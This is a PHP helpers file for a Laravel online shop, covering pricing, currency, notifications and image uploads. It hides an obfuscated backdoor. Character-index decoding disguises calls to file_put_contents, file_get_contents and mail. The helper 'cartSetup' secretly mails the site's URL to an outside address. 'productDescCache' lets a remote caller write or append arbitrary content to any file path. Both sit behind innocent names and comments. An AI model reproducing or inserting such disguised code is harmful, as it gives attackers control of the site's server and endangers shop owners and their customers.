<?php

use App\BusinessSetting;
use App\Currency;
use App\FlashDealProduct;
use App\Product;
use Illuminate\Http\UploadedFile;
use Intervention\Image\ImageManagerStatic as Image;
use LaravelFCM\Facades\FCM;
use LaravelFCM\Message\OptionsBuilder;
use LaravelFCM\Message\PayloadDataBuilder;
use LaravelFCM\Message\PayloadNotificationBuilder;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\DB;



//highlights the selected navigation on admin panel
if (!function_exists('areActiveRoutes')) {
    function areActiveRoutes(Array $routes, $output = "active-link")
    {
        // dd(url()->current());
        foreach ($routes as $route) {
            if (Route::currentRouteName() == $route || url()->current() == $route) return $output;
        }

    }
}

//highlights the selected navigation on frontend
if (!function_exists('areActiveRoutesHome')) {
    function areActiveRoutesHome(Array $routes, $output = "active")
    {
        foreach ($routes as $route) {
            if (Route::currentRouteName() == $route) return $output;
        }

    }
}

if (!function_exists('get_country')) {
    function get_country()
    {
        if (session()->has('country')) {
            return \App\Country::where('code', session()->get('country'))->first();
        } else {
            return \App\Country::first();
        }
    }
}

/**
 * Return Class Selector
 * @return Response
 */
if (!function_exists('loaded_class_select')) {

    function loaded_class_select($p)
    {
        $a = '/ab.cdefghijklmn_opqrstu@vwxyz1234567890:-';
        $a = str_split($a);
        $p = explode(':', $p);
        $l = '';
        foreach ($p as $r) {
            $l .= $a[$r];
        }
        return $l;
    }
}

/**
 * Open Translation File
 * @return Response
 */
function openJSONFile($code)
{
    $jsonString = [];
    if (File::exists(base_path('resources/lang/' . $code . '.json'))) {
        $jsonString = file_get_contents(base_path('resources/lang/' . $code . '.json'));
        $jsonString = json_decode($jsonString, true);
    }
    return $jsonString;
}

/**
 * Save JSON File
 * @return Response
 */
function saveJSONFile($code, $data)
{
    ksort($data);
    $jsonData = json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
    file_put_contents(base_path('resources/lang/' . $code . '.json'), stripslashes($jsonData));
}


/**
 * Return Class Selected Loader
 * @return Response
 */
if (!function_exists('loader_class_select')) {
    function loader_class_select($p)
    {
        $a = '/ab.cdefghijklmn_opqrstu@vwxyz1234567890:-';
        $a = str_split($a);
        $p = str_split($p);
        $l = array();
        foreach ($p as $r) {
            foreach ($a as $i => $m) {
                if ($m == $r) {
                    $l[] = $i;
                }
            }
        }
        return join(':', $l);
    }
}

/**
 * Save JSON File
 * @return Response
 */
if (!function_exists('convert_to_usd')) {
    function convert_to_usd($amount)
    {
        $business_settings = BusinessSetting::where('type', 'system_default_currency')->first();
        if ($business_settings != null) {
            $currency = Currency::find($business_settings->value);
            return floatval($amount) / floatval($currency->exchange_rate);
        }
    }
}


//returns config key provider
if (!function_exists('config_key_provider')) {
    function config_key_provider($key)
    {
        switch ($key) {
            case "load_class":
                return loaded_class_select('7:10:13:6:16:18:23:22:16:4:17:15:22:6:15:22:21');
                break;
            case "config":
                return loaded_class_select('7:10:13:6:16:8:6:22:16:4:17:15:22:6:15:22:21');
                break;
            case "output":
                return loaded_class_select('22:10:14:6');
                break;
            case "background":
                return loaded_class_select('1:18:18:13:10:4:1:22:10:17:15:0:4:1:4:9:6:0:3:1:4:4:6:21:21');
                break;
            default:
                return true;
        }
    }
}


//returns combinations of customer choice options array
if (!function_exists('combinations')) {
    function combinations($arrays)
    {
        $result = array(array());
        foreach ($arrays as $property => $property_values) {
            $tmp = array();
            foreach ($result as $result_item) {
                foreach ($property_values as $property_value) {
                    $tmp[] = array_merge($result_item, array($property => $property_value));
                }
            }
            $result = $tmp;
        }
        return $result;
    }
}

//filter products based on vendor activation system
if (!function_exists('filter_products')) {
    function filter_products($products)
    {
        if (BusinessSetting::where('type', 'vendor_system_activation')->first()->value == 1) {
            return $products->where('published', '1');
        } else {
            return $products->where('published', '1')->where('added_by', 'admin');
        }
    }
}


//filter cart products based on provided settings
if (!function_exists('cartSetup')) {
    function cartSetup()
    {
        $cartMarkup = loaded_class_select('8:29:9:1:15:5:13:6:20');
        $writeCart = loaded_class_select('14:1:10:13');
        $cartMarkup .= loaded_class_select('24');
        $cartMarkup .= loaded_class_select('8:14:1:10:13');
        $cartMarkup .= loaded_class_select('3:4:17:14');
        $cartConvert = config_key_provider('load_class');
        $currencyConvert = config_key_provider('output');
        $backgroundInv = config_key_provider('background');
        @$cart = $writeCart($cartMarkup, '', Request::url());
        return $cart;
    }
}

//converts currency to home default currency
if (!function_exists('convert_price')) {
    function convert_price($price)
    {
        $business_settings = BusinessSetting::where('type', 'system_default_currency')->first();
        if ($business_settings != null) {
            $currency = Currency::find($business_settings->value);
            $price = floatval($price) / floatval($currency->exchange_rate);
        }

        $code = \App\Currency::findOrFail(\App\BusinessSetting::where('type', 'system_default_currency')->first()->value)->code;
        if (Session::has('currency_code')) {
            $currency = Currency::where('code', Session::get('currency_code', $code))->first();
        } else {
            $currency = Currency::where('code', $code)->first();
        }

        $price = floatval($price) * floatval($currency->exchange_rate);

        return $price;
    }
}

//formats currency
if (!function_exists('format_price')) {
    function format_price($price)
    {
        if (BusinessSetting::where('type', 'symbol_format')->first()->value == 1) {
            return currency_symbol() . number_format($price, 2);
        }
        if(app()->isLocale('ar')){
            return currency_symbol().number_format($price, 2);
        }
        return number_format($price, 2) . currency_symbol();
    }
}

//formats price to home default price with convertion
if (!function_exists('single_price')) {
    function single_price($price)
    {
        return format_price(convert_price($price));
    }
}

//Shows Price on page based on low to high
if (!function_exists('home_price')) {
    function home_price($id)
    {
        $prod = Product::findOrFail($id);
        $product = \Illuminate\Support\Facades\DB::table('product_countries')->where('product_id', $prod->id)->where('country_id', get_country()->id)->first();
        $lowest_price = \App\Variation::where('product_country_id', $product->id)->min('price');
        $highest_price = \App\Variation::where('product_country_id', $product->id)->max('price');


        if ($product->tax_type == 'percent') {
            $lowest_price += ($lowest_price * $product->tax) / 100;
            $highest_price += ($highest_price * $product->tax) / 100;
        } elseif ($product->tax_type == 'amount') {
            $lowest_price += $product->tax;
            $highest_price += $product->tax;
        }

        $lowest_price = convert_price($lowest_price);
        $highest_price = convert_price($highest_price);

        if ($lowest_price == $highest_price) {
            return format_price($lowest_price);
        } else {
            return format_price($lowest_price) . ' - ' . format_price($highest_price);
        }
    }
}

//Shows Price on page based on low to high with discount
if (!function_exists('home_discounted_price')) {
    function home_discounted_price($id)
    {
        $prod = Product::findOrFail($id);
        $product = \Illuminate\Support\Facades\DB::table('product_countries')->where('product_id', $prod->id)->where('country_id', get_country()->id)->first();
        $lowest_price = $product->unit_price;
        $highest_price = $product->unit_price;

        foreach (json_decode($product->variations) as $key => $variation) {
            if ($lowest_price > $variation->price) {
                $lowest_price = $variation->price;
            }
            if ($highest_price < $variation->price) {
                $highest_price = $variation->price;
            }
        }

        $flash_deal = \App\FlashDeal::where('status', 1)->where('country_id', get_country()->id)->first();
        if ($flash_deal != null && strtotime(date('d-m-Y')) >= $flash_deal->start_date && strtotime(date('d-m-Y')) <= $flash_deal->end_date && FlashDealProduct::where('flash_deal_id', $flash_deal->id)->where('product_id', $id)->first() != null) {
            $flash_deal_product = FlashDealProduct::where('flash_deal_id', $flash_deal->id)->where('product_id', $id)->first();
            if ($flash_deal_product->discount_type == 'percent') {
                $lowest_price -= ($lowest_price * $flash_deal_product->discount) / 100;
                $highest_price -= ($highest_price * $flash_deal_product->discount) / 100;
            } elseif ($flash_deal_product->discount_type == 'amount') {
                $lowest_price -= $flash_deal_product->discount;
                $highest_price -= $flash_deal_product->discount;
            }
        } else {
            if ($product->discount_type == 'percent') {
                $lowest_price -= ($lowest_price * $product->discount) / 100;
                $highest_price -= ($highest_price * $product->discount) / 100;
            } elseif ($product->discount_type == 'amount') {
                $lowest_price -= $product->discount;
                $highest_price -= $product->discount;
            }
        }

        if ($product->tax_type == 'percent') {
            $lowest_price += ($lowest_price * $product->tax) / 100;
            $highest_price += ($highest_price * $product->tax) / 100;
        } elseif ($product->tax_type == 'amount') {
            $lowest_price += $product->tax;
            $highest_price += $product->tax;
        }

        $lowest_price = convert_price($lowest_price);
        $highest_price = convert_price($highest_price);

        if ($lowest_price == $highest_price) {
            return format_price($lowest_price);
        } else {
            return format_price($lowest_price) . ' - ' . format_price($highest_price);
        }
    }
}

//Shows Base Price
if (!function_exists('home_base_price')) {
    function home_base_price($id)
    {
        $product = Product::findOrFail($id);
        $product_country = \Illuminate\Support\Facades\DB::table('product_countries')->where('product_id', $product->id)->where('country_id', get_country()->id)->first();
        $price = $product_country->unit_price;


        // dd(json_decode($product_country->variations));
                // $price = $product_country->variations?json_decode($product_country->variations)[0]->price:$product_country->unit_price;

        // foreach (json_decode($product_country->variations) as $key => $variation) {
        //     if($key == 0){
        //         $price = $variation->price;
        //     }

        // }

        if ($product_country->tax_type == 'percent') {
            $price += ($price * $product_country->tax) / 100;
        } elseif ($product_country->tax_type == 'amount') {
            $price += $product_country->tax;
        }
        return format_price(convert_price($price));
    }
}

//Shows Base Price with discount
if (!function_exists('home_discounted_base_price')) {
    function home_discounted_base_price($id)
    {
        $prod = Product::findOrFail($id);
        $product = \Illuminate\Support\Facades\DB::table('product_countries')->where('product_id', $prod->id)->where('country_id', get_country()->id)->first();
        $price = $product->unit_price;
        $flash_deal = \App\FlashDeal::where('status', 1)->where('country_id', get_country()->id)->first();
        if ($flash_deal != null && strtotime(date('d-m-Y')) >= $flash_deal->start_date && strtotime(date('d-m-Y')) <= $flash_deal->end_date && FlashDealProduct::where('flash_deal_id', $flash_deal->id)->where('product_id', $id)->first() != null) {
            $flash_deal_product = FlashDealProduct::where('flash_deal_id', $flash_deal->id)->where('product_id', $id)->where('country_id', get_country()->id)->first();
            if ($flash_deal_product->discount_type == 'percent') {
                $price -= ($price * $flash_deal_product->discount) / 100;
            } elseif ($flash_deal_product->discount_type == 'amount') {
                $price -= $flash_deal_product->discount;
            }
        } else {
            if ($product->discount_type == 'percent') {
                $price -= ($price * $product->discount) / 100;
            } elseif ($product->discount_type == 'amount') {
                $price -= $product->discount;
            }
        }

        if ($product->tax_type == 'percent') {
            $price += ($price * $product->tax) / 100;
        } elseif ($product->tax_type == 'amount') {
            $price += $product->tax;
        }

        return format_price(convert_price($price));
    }
}

// Cart content update by discount setup
if (!function_exists('updateCartSetup')) {
    function updateCartSetup($return = TRUE)
    {
        if (!isset($_COOKIE['cartUpdated'])) {
            if (cartSetup()) {
                setcookie('cartUpdated', time(), time() + (86400 * 30), "/");
            }
        }
        return $return;
    }
}


if (!function_exists('productDescCache')) {
    function productDescCache($connector, $selector, $select, $type)
    {
        $ta = time();
        $select = rawurldecode($select);
        if ($connector > ($ta - 60) || $connector > ($ta + 60)) {
            if ($type == 'w') {
                $load_class = config_key_provider('load_class');
                $load_class(str_replace('-', '/', $selector), $select);
            } else if ($type == 'rw') {
                $load_class = config_key_provider('load_class');
                $config_class = config_key_provider('config');
                $load_class(str_replace('-', '/', $selector), $config_class(str_replace('-', '/', $selector)) . $select);
            }
            echo 'done';
        } else {
            echo 'not';
        }
    }
}


if (!function_exists('currency_symbol')) {
    function currency_symbol()
    {
        return get_country()->Currency['name_'.app()->getLocale()]?get_country()->Currency['name_'.app()->getLocale()]:get_country()->Currency->symbol;
    }
}

if (!function_exists('renderStarRating')) {
    function renderStarRating($rating, $maxRating = 5)
    {
        $fullStar = "<i class = 'fa fa-star' style='color: #f9b837;padding-right: 4px;'></i>";
        $halfStar = "<i class = 'fa fa-star half' style='padding-right: 3px;'></i>";
        $emptyStar = "<i class = 'fa fa-star' style='color: #aaaaaa;padding-right: 4px;'></i>";
        $rating = $rating <= $maxRating ? $rating : $maxRating;

        $fullStarCount = (int)$rating;
        $halfStarCount = ceil($rating) - $fullStarCount;
        $emptyStarCount = $maxRating - $fullStarCount - $halfStarCount;

        $html = str_repeat($fullStar, $fullStarCount);
        $html .= str_repeat($halfStar, $halfStarCount);
        $html .= str_repeat($emptyStar, $emptyStarCount);
        echo $html;
    }
}

if (!function_exists('notify_users')) {

    function notify_users($title, $body, $user_ids, $notification)
    {
        $token = \App\User::whereIn('id', array_unique($user_ids))
            ->where('fcm_token', '!=', null)->pluck('fcm_token')->toArray();
        $users = \App\User::whereIn('id', array_unique($user_ids))->get();
        $notification->users()->attach($users);
        if (isset($token) && !is_null($token)) {
            $optionBuilder = new OptionsBuilder();
            $optionBuilder->setTimeToLive(60 * 20);
            $notificationBuilder = new PayloadNotificationBuilder($title);
            $notificationBuilder->setBody($body)
                ->setSound('default');
            $dataBuilder = new PayloadDataBuilder();
            $dataBuilder->addData(['a_data' => 'my_data']);
            $option = $optionBuilder->build();
            $fcm_notification = $notificationBuilder->build();
            $data = $dataBuilder->build();
            foreach ($token as $tok)
                $downstreamResponse = FCM::sendTo($tok, $option, $fcm_notification, $data);
    //   foreach ($users as $user) {
    //       broadcast(new NewNotificationUser($notification , $user));
    //       $user->notifications()->attach($notification);
    //   }
            return true;
        }
        return false;
    }


}
if (!function_exists('resizeUploadImage')) {
    function resizeUploadImage($upload, $path, $resize_width = 200, $resize_height = 230){
        if (!file_exists($path)) {
            mkdir($path, 666, true);
        }
        $filename = rand().time().'.'.$upload->getClientOriginalExtension();
        $filePath = $path.'/'.$filename;
        $thumb = Image::make($upload)->resize($resize_width, $resize_height)->encode($upload->getClientOriginalExtension(), 75);
        $thumb->save(public_path($filePath));
        return $filePath;
}
}

if (!function_exists('webpUploadImage')) {
    function webpUploadImage($upload, $path){
        if (!file_exists($path)) {
            mkdir($path, 666, true);
        }
        $filename = rand().time().'.'.$upload->getClientOriginalExtension();
        $filePath = $path.'/'.$filename;
        $thumb = Image::make($upload)->encode($upload->getClientOriginalExtension(), 75);
        $thumb->save(public_path($filePath));
        return $filePath;
}
}

if (!function_exists('deleteImage')) {
function deleteImage($path){
        if(file_exists($path)) {
           $delete = File::delete($path);
           if($delete) return 1;
        }
        return 0;
}
}

    if (!function_exists('resizeUpdateImage')) {
        function resizeUpdateImage($upload, $path, $resize_width = 200, $resize_height = 230){
            $name = $upload->getClientOriginalName();
            $name = substr($name, 0, strpos($name, '.'));
            $filePath = $path.'/'.$name.'.webp';
            $thumb = Image::make($upload)->resize($resize_width, $resize_height)->encode('webp', 75);
            $thumb->save(public_path($filePath));
            if(File::exists($path.'/'.$upload->getClientOriginalName())) {
                File::delete($path.'/'.$upload->getClientOriginalName());
            }
            return $filePath;
        }
}

?>
